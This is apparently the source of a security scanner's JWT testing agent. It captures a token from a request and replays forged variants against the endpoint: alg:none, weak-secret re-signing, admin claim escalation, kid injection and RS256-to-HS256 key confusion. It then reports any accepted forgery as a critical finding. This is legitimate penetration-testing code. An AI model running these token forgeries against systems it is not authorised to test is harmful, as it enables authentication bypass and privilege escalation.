"""JWT VulnAgent — registered, dispatchable JWT verification testing.

Before this agent, JWT attacks lived in two un-dispatchable places: the passive
``jwt_tester`` plugin (which spawned its own DIRECT httpx client, bypassing the
MITM, so its probes were never recorded) and inline probes inside
``business_logic_agent``. This agent consolidates the attack set (alg:none,
weak HMAC secrets, claim escalation, kid injection — all from
``dast/payloads/jwt.yaml`` + ``dast/utils/jwt.py`` primitives) into a registered
VulnAgent whose probes go through the shared proxy-routed transport, so every
forged-token attempt is recorded like any other scan traffic.

Dispatch: the coordinator adds ``jwt`` as a candidate when a JWT-shaped token is
found in the target's Authorization header, cookies, or a parameter value
(``_find_jwts`` is the single detector, used by both the dispatch rule and the
agent itself). ``_PARAM_ATTACK_MAP["token"]`` now maps ``token``-class params to
this agent — fulfilling the 2-C roadmap note.

Method: capture the clean baseline, verify the endpoint actually ENFORCES the
token (an unauthenticated replay that looks like the baseline means no
enforcement — testing forgery there is noise), then replay forged variants
(alg:none headers from the yaml, weak-HMAC re-signs, escalated claims, kid
injection) and apply jwt_tester's ``_accepted`` acceptance heuristic (same
success status — or 401/403→200 auth-bypass — non-trivial body, size within
±30% of baseline). First accepted forgery wins.
"""

from __future__ import annotations

import re
from typing import Optional, TYPE_CHECKING, Dict, List, Tuple

from dast.ai.agent_base import AgentFinding, VulnAgent
from dast.ai.coordinator import Coordinator
from dast.payloads.loader import get_payloads
from dast.proxy.plugin_manager import log_event
from dast.scanners.active_checks import _send as _SEND
from dast.utils.jwt import decode_jwt, build_token
from dast.utils.logger import get_logger

if TYPE_CHECKING:
    import httpx
    from dast.scanners.active_checks import CheckTarget

logger = get_logger(__name__)

_JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]{5,}\.[A-Za-z0-9_-]{5,}\.[A-Za-z0-9_-]{0,50}")
_MAX_TOKENS = 2          # distinct tokens tested per endpoint
_MAX_VARIANTS = 24       # forged-token sends per token, hard cap
_WEAK_SECRETS_CAP = 8

_ESCALATION_KEYS = ("role", "roles", "is_admin", "admin", "privilege", "scope", "group")

def _find_jwts(target: "CheckTarget") -> List[Tuple[str, Dict]]:
    """Locate JWT-shaped tokens in the target request. Returns (source, param)
    pairs where ``param`` is a send_probe param dict (header/cookie/query) that
    reproduces the token's location. Order: Authorization, cookies, params."""
    found: List[Tuple[str, Dict]] = []
    seen: set = set()

    auth = (target.headers or {}).get("authorization", "")
    if auth.lower().startswith("bearer "):
        token = auth[7:].strip()
        if _JWT_RE.fullmatch(token):
            found.append((token, {"name": "authorization", "location": "header",
                                  "value": auth}))
            seen.add(token)

    cookie_header = (target.headers or {}).get("cookie", "")
    for part in cookie_header.split(";"):
        if "=" in part:
            name, _, value = part.partition("=")
            value = value.strip()
            if _JWT_RE.fullmatch(value) and value not in seen:
                found.append((value, {"name": name.strip(), "location": "cookie",
                                      "value": value}))
                seen.add(value)

    for param in target.params or []:
        value = str(param.get("value", ""))
        if _JWT_RE.fullmatch(value) and value not in seen:
            found.append((value, dict(param)))
            seen.add(value)
    return found[:_MAX_TOKENS]


def has_jwt_target(target: "CheckTarget") -> bool:
    """Dispatch-side check (coordinator rule): the request carries a JWT."""
    return bool(_find_jwts(target))


def _accepted(resp, baseline_status: int, baseline_len: int) -> bool:
    """jwt_tester's acceptance heuristic: the forged token must be served like
    the baseline (or unlock a protected endpoint: 401/403 -> 200), with a
    non-trivial body within ±30% of the baseline size."""
    if resp is None:
        return False
    if resp.status_code != baseline_status:
        if baseline_status in (401, 403) and resp.status_code == 200:
            return True  # auth bypass: was protected, now open
        return False
    if len(resp.text) < 50:
        return False
    size_ratio = len(resp.text) / max(baseline_len, 1)
    return 0.7 <= size_ratio <= 1.3


async def _fetch_hs_secrets(client: "httpx.AsyncClient",
                            target: "CheckTarget") -> List[str]:
    """Same-host jwks → HMAC secret candidates for the RS256→HS256 confusion.
    Silent skip: no jwks reachable means the variant is not applicable."""
    from urllib.parse import urlparse as _up
    try:
        p = _up(target.url)
        base = f"{p.scheme}://{p.netloc}"
        resp = await client.get(f"{base}/.well-known/jwks.json")
        keys = (resp.json() or {}).get("keys", [])
        for k in keys:
            if k.get("kty") == "RSA" and k.get("n"):
                n = str(k["n"])
                cands = [n]
                try:
                    import base64 as _b64
                    raw = _b64.urlsafe_b64decode(n + "=" * (-len(n) % 4)).decode("latin-1")
                    cands.append(raw)
                except Exception:
                    pass
                return cands
    except Exception:
        pass
    return []


def _forged_variants(token: str, hs_secrets: Optional[List[str]] = None) -> List[Tuple[str, str]]:
    """(label, forged_token) attack set — alg:none, weak-HMAC, RS256→HS256
    key confusion (4-B), escalation, kid."""
    decoded = decode_jwt(token)
    if not decoded:
        return []
    header, payload = decoded
    variants: List[Tuple[str, str]] = []

    # 1) alg:none — header templates from jwt.yaml + original claims, empty sig.
    for none_header in get_payloads("jwt", "alg_none") or []:
        variants.append((f"alg:none ({none_header[:16]}…)",
                         f"{none_header}.{token.split('.')[1]}."))

    # 2) Weak HMAC secrets — re-sign the ORIGINAL header+claims with known keys.
    orig_alg = header.get("alg", "")
    if orig_alg.startswith("HS"):
        escalated_payload = dict(payload)
        for key in _ESCALATION_KEYS:
            if key in escalated_payload:
                escalated_payload[key] = "admin" if key != "roles" else ["admin"]
        for secret in (get_payloads("jwt", "weak_secrets") or [])[:_WEAK_SECRETS_CAP]:
            variants.append((f"weak secret {secret!r} (original claims)",
                             build_token(header, payload, secret=secret)))
            variants.append((f"weak secret {secret!r} (escalated claims)",
                             build_token(header, escalated_payload, secret=secret)))

    # 3) Claim escalation via alg:none (highest-impact forged identity).
    escalated = dict(payload)
    for key in _ESCALATION_KEYS:
        if key in escalated:
            escalated[key] = "admin" if key != "roles" else ["admin"]
    for none_header in (get_payloads("jwt", "alg_none") or [])[:3]:
        variants.append((f"alg:none + escalated claims ({none_header[:16]}…)",
                         f"{none_header}.{_encode_json(escalated)}."))

    # 4) kid injection — verifier fetches /dev/null or an SQL-crafted key.
    if "kid" in header:
        for kid in get_payloads("jwt", "kid_injection") or []:
            forged_header = dict(header, kid=kid)
            variants.append((f"kid injection {kid!r}",
                             build_token(forged_header, payload, secret="")))
    # 5) RS256→HS256 key confusion (4-B, ARTEX api-security P2): a verifier
    # that validates RS256 tokens but accepts HS256 with the PUBLIC key
    # material as the HMAC secret. Candidates: the jwks `n` string verbatim
    # and its raw decoded bytes (the two common naive implementations).
    for secret in (hs_secrets or []):
        hs_header = dict(header, alg="HS256")
        variants.append((f"RS256->HS256 key confusion (secret={secret[:16]}..., original claims)",
                         build_token(hs_header, payload, secret=secret)))
        escalated2 = dict(payload)
        for key in _ESCALATION_KEYS:
            if key in escalated2:
                escalated2[key] = "admin" if key != "roles" else ["admin"]
        variants.append(("RS256->HS256 key confusion (escalated claims)",
                         build_token(hs_header, escalated2, secret=secret)))
    return variants[:_MAX_VARIANTS + 4]


def _encode_json(obj) -> str:
    from dast.utils.jwt import b64url_encode_json
    return b64url_encode_json(obj)


class JwtAgent(VulnAgent):
    name = "JWT Agent"
    attack_type = "jwt"
    description = ("JWT verification testing: alg:none, weak HMAC secrets, claim "
                   "escalation, kid injection — proxy-routed, recorded probes")

    async def run(
        self,
        target: "CheckTarget",
        client: "httpx.AsyncClient",
        collaborator=None,
    ) -> List[AgentFinding]:
        from dast.agents import probe_common

        tokens = _find_jwts(target)
        if not tokens:
            return []

        for token, param in tokens:
            # 4-B: RS256 tokens get the key-confusion variants when a same-host
            # jwks is reachable (public key material as the HMAC secret).
            hs_secrets: List[str] = []
            try:
                from dast.utils.jwt import decode_jwt_header
                header_probe = decode_jwt_header(token)
                if str(header_probe.get("alg", "")).upper() == "RS256":
                    hs_secrets = await _fetch_hs_secrets(client, target)
            except Exception:
                hs_secrets = []

            # Baseline: the request AS the operator captured it.
            baseline = await probe_common.send_probe(target, client, param,
                                                     param.get("value", ""), send=_SEND)
            if baseline is None:
                continue
            baseline_status, baseline_len = baseline.status_code, len(baseline.text)

            # ENFORCEMENT PRECHECK: replay WITHOUT the token. An endpoint that serves
            # the same content unauthenticated does not enforce this token at all —
            # forgery testing there is pure noise.
            unauth_param = dict(param)
            unauth_param["value"] = ""
            unauth = await probe_common.send_probe(target, client, unauth_param,
                                                   "", send=_SEND)
            if unauth is not None and _accepted(unauth, baseline_status, baseline_len):
                logger.info("jwt: endpoint does not enforce the token — skipping forgery",
                            url=target.url)
                continue

            for label, forged in _forged_variants(token, hs_secrets=hs_secrets):
                # Preserve the captured scheme: an "Authorization: Bearer <jwt>"
                # source must send "Bearer <forged>", not the bare token.
                scheme = ""
                m_scheme = re.match(r"(?i)^(bearer\s+)", str(param.get("value", "")))
                if m_scheme:
                    scheme = m_scheme.group(1)
                forged_value = f"{scheme}{forged}"
                resp = await probe_common.send_probe(
                    target, client, {**param, "value": forged_value}, forged_value,
                    send=_SEND)
                if resp is not None and _accepted(resp, baseline_status, baseline_len):
                    log_event("agent", "finding",
                              f"JWT verification bypass confirmed on {target.url} ({label})",
                              url=target.url, finding="JWT bypass", source="agent")
                    return [AgentFinding(
                        title="JWT Verification Bypass",
                        severity="critical",
                        cwe="CWE-347",
                        attack_type="jwt",
                        evidence=(
                            f"A forged JWT was ACCEPTED where the original token was required: "
                            f"{label}. The server failed to verify the signature properly "
                            f"(alg:none / weak HMAC secret / unenforced kid). The accepted "
                            f"forgery was: {forged[:120]}…\n\n"
                            f"Baseline: {baseline_status} ({baseline_len}B) — forged response: "
                            f"{resp.status_code} ({len(resp.text)}B)"
                        ),
                        confirmed=True,
                        payload=forged[:200],
                        parameter=param.get("name", ""),
                        url=target.url,
                        request_method=target.method,
                        bypass_validation=True,
                        extracted_data={"variant": label,
                                        "forged_token": forged},
                    )]
        return []


Coordinator.register(JwtAgent)
